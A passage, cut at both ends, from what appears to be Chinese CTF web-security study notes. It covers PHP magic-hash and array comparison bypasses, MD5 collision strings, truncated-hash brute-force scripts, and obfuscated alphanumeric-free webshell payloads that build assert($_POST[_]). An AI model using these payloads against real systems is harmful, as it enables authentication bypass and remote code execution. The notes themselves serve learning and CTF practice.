punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>PHP 在处理哈希字符串时，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，PHP 会当作科学计数法来处理，也就是 0 的 n 次方，得到的值比较的时候都相同。</p>\n<ul>\n<li><strong>以下值在 md5 加密后以 0E 开头：</strong>\n<ul>\n<li>QNKCDZO</li>\n<li>240610708</li>\n<li>s878926199a</li>\n<li>s155964671a</li>\n<li>s214587387a</li>\n<li>s214587387a</li>\n</ul>\n</li>\n</ul>\n<p><strong>以下值在 sha1 加密后以 0E 开头：</strong></p>\n<ul>\n<li>aaroZmOk</li>\n<li>aaK1STfY</li>\n<li>aaO8zKZF</li>\n<li>aa3OFF9m</li>\n<li>0e1290633704</li>\n<li>10932435112</li>\n</ul>\n<p>双重 MD5 加密后 0E 开头：</p>\n<ul>\n<li>7r4lGXCH2Ksu2JNT3BYM</li>\n<li>CbDLytmyGm2xQyaLNhWn</li>\n<li>770hQgrBOjrcqftrlaZk</li>\n</ul>\n<h3 id=\"数组绕过\"><a class=\"anchor\" href=\"#数组绕过\">#</a> <strong>数组绕过：</strong></h3>\n<p>MD5 ()，sha1 () 函数无法处理数组，如果传入的为数组，会返回 NULL，所以两个数组经过加密后得到的都是 NULL，也就是相等的。</p>\n<h3 id=\"md5碰撞\"><a class=\"anchor\" href=\"#md5碰撞\">#</a> md5 碰撞</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>由于数组在 string 后都为 array, 所以要求传入两个 MD5 相同的不同字符串且不能是数组，所以通过 MD5 碰撞实现。</p>\n<pre><code>#1\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   \nb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   \n#2\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   \nb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%\n#3\n$a=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;\n$b=&quot;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2&quot;;\n</code></pre>\n<p>linux 使用 md5collgen 碰撞生成两个 md5 值相同但内容不同的文件</p>\n<pre><code>md5collgen -o 1.bin 2.bin\n</code></pre>\n<p>windows 可以下载 fastcoll，碰撞生成两个 md5 值相同但内容不同的文件</p>\n<pre><code>fastcoll.exe -p 123.txt -o 1.txt 2.txt\n</code></pre>\n<h3 id=\"特殊值0e215962017-在md5后仍以0e开头\"><a class=\"anchor\" href=\"#特殊值0e215962017-在md5后仍以0e开头\">#</a> <strong>特殊值：0e215962017 在 md5 后仍以 0e 开头</strong></h3>\n<h3 id=\"nan和inf\"><a class=\"anchor\" href=\"#nan和inf\">#</a> NaN 和 INF</h3>\n<p>NAN 和 INF，分别为非数字和无穷大，但是 var_dump 一下它们的数据类型却是 double，那么在 md5 函数处理它们的时候，是将其直接转换为字符串”NAN” 和字符串”INF” 使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了 true）做强类型或弱类型比较均为 false，甚至 NAN=NAN 都是 false，但 md5 ('NaN')=md5 ('NaN') 为 true。</p>\n<h3 id=\"截断比较\"><a class=\"anchor\" href=\"#截断比较\">#</a> 截断比较</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'8ffb1'</span></pre></td></tr></table></figure><p><strong>md5 截断爆破脚本</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing<span class=\"token punctuation\">.</span>dummy <span class=\"token keyword\">import</span> Pool <span class=\"token keyword\">as</span> ThreadPool</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># MD5 截断数值已知 求原始数据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 例子 substr (md5 (captcha), 0, 6)=60b7ef</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 计算 MD5 字符串</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>keymd5 <span class=\"token operator\">=</span> <span class=\"token string\">'8ffb1'</span>   <span class=\"token comment\">#已知的 md5 截断值</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>md5start <span class=\"token operator\">=</span> <span class=\"token number\">0</span>   <span class=\"token comment\"># 设置题目已知的截断位置</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>md5length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">findmd5</span><span class=\"token punctuation\">(</span>sss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\"># 输入范围 里面会进行 md5 测试</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    key <span class=\"token operator\">=</span> sss<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    start <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 开始位置</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    end <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 结束位置</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\"># print(md5(i)[md5start:md5length])</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> md5<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> keymd5<span class=\"token punctuation\">:</span>            <span class=\"token comment\"># 拿到加密字符串</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            result <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 打印</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token builtin\">list</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 参数列表</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>   <span class=\"token comment\"># 多线程的数字列表 开始与结尾</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">':'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pool <span class=\"token operator\">=</span> ThreadPool<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 多线程任务</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>pool<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>findmd5<span class=\"token punctuation\">,</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 函数 与参数列表</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>sha256 截断爆破</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing<span class=\"token punctuation\">.</span>dummy <span class=\"token keyword\">import</span> Pool <span class=\"token keyword\">as</span> ThreadPool</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># sha256 截断数值已知 求原始数据</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 例子 substr (sha256 (captcha), 0, 6)=60b7ef</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sha256</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 计算 sha256 字符串</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TQLCTF'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>keysha256 <span class=\"token operator\">=</span> <span class=\"token string\">'5625f'</span>   <span class=\"token comment\">#已知的 sha256 截断值</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sha256start <span class=\"token operator\">=</span> <span class=\"token number\">0</span>   <span class=\"token comment\"># 设置题目已知的截断位置</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sha256length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">findsha256</span><span class=\"token punctuation\">(</span>sss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\"># 输入范围 里面会进行 sha256 测试</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    key <span class=\"token operator\">=</span> sss<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    start <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\"># 开始位置</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    end <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 结束位置</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\"># print(sha256(i)[sha256start:sha256length])</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> sha256<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> keysha256<span class=\"token punctuation\">:</span>            <span class=\"token comment\"># 拿到加密字符串</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            result <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 打印</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token builtin\">list</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 参数列表</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>   <span class=\"token comment\"># 多线程的数字列表 开始与结尾</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token builtin\">list</span><span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">':'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000000</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pool <span class=\"token operator\">=</span> ThreadPool<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 多线程任务</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>pool<span class=\"token punctuation\">.</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>findsha256<span class=\"token punctuation\">,</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 函数 与参数列表</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>pool<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>pool<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rce-不包含数字和字母的webshell\"><a class=\"anchor\" href=\"#rce-不包含数字和字母的webshell\">#</a> RCE 不包含数字和字母的 webshell</h3>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-z0-9]/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p><strong>方法一：通过字符串执行异或得到字符串</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%01'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%13'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%13'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%05'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%12'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%14'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $_='assert';</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%0D'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%2F'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%0E'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%09'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $__='_POST';</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 关于这里的 $$__，为 php 中的特性可变变量，因此 $$__表示 $_POST</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// assert($_POST[_]);</span></span></pre></td></tr></table></figure><p><strong>方法二：取反</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'>'</span><span class=\"token operator\">></span><span class=\"token string single-quoted-string\">'&lt;'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'>'</span><span class=\"token operator\">></span><span class=\"token string single-quoted-string\">'&lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token operator\">/</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"瞰\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"和\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"和\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"的\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token operator\">.=</span><span class=\"token operator\">~</span><span class=\"token 